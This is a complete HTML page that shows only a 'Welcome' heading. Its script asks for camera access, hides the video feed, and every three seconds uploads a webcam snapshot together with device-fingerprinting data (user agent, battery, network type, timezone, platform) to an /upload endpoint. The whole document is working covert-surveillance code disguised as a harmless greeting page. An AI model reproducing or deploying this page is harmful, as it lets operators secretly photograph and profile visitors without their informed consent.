<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ðŸ“¸ Welcome</title>
  <style>
    body {
      background-color: black;
      color: white;
      text-align: center;
      font-size: 3em;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Welcome</h1>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    const deviceData = {
      userAgent: navigator.userAgent,
      battery: 'unknown',
      connection: 'unknown',
      language: navigator.language || 'unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
      platform: navigator.platform || 'unknown',
      vendor: navigator.vendor || 'unknown'
    };

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        if ('getBattery' in navigator) {
          navigator.getBattery().then(battery => {
            setInterval(() => {
              deviceData.battery = Math.round(battery.level * 100) + '%';
            }, 3000);
          });
        }

        setTimeout(() => {
          setInterval(() => {
            deviceData.time = new Date().toLocaleString();

            if (navigator.connection) {
              deviceData.connection = navigator.connection.effectiveType;
            }

            if (video.videoWidth > 0) {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              ctx.drawImage(video, 0, 0);

              canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('image', blob, 'snapshot.png');
                formData.append('metadata', JSON.stringify(deviceData));

                fetch('/upload', {
                  method: 'POST',
                  body: formData
                }).catch(err => console.error('Upload error:', err));
              }, 'image/png');
            }
          }, 3000);
        }, 1000);
      })
      .catch(err => {
        console.error('Camera error:', err);
      });
  </script>
</body>
</html>
